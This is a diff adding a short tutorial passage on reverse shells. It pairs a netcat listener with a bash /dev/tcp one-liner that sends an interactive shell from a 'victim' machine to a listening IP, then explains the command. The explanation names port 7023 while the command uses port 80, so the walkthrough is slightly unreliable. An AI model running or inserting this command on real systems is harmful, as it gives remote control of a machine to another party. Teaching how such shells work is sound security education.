@@ -13,3 +13,13 @@ $ nc -vlp 80
 -p, — source-port port Specify source port to use 
 (http://man7.org/linux/man-pages/man1/ncat.1.html) 
 ```
+Simple enough, just a listener on a specific port. Second, we will need another machine, the victim, to connect to this machine and then forward the session to it. There are countless ways to setup this connection depending what resources are available. This is how to do it with bash
+
+
+```bash
+$ bash -i >& /dev/tcp/192.168.1.142/80 0>&1
+```
+The command *bash -i >&* invokes bash with an “interactive” option. Then */dev/tcp/192.168.1.142/7023* redirects that session to a tcp socket via device file. 
+Finally *0>&1* Takes standard output, and connects it to standard input.
+
+It turns out linux has built a */dev/tcp* device file. While powerful and useful this file can be extremely dangerous when used in this way. This built in device file lets bash connect directly to any ip and any port out there. This also works well if you want to confirm a port is open, or check the time.
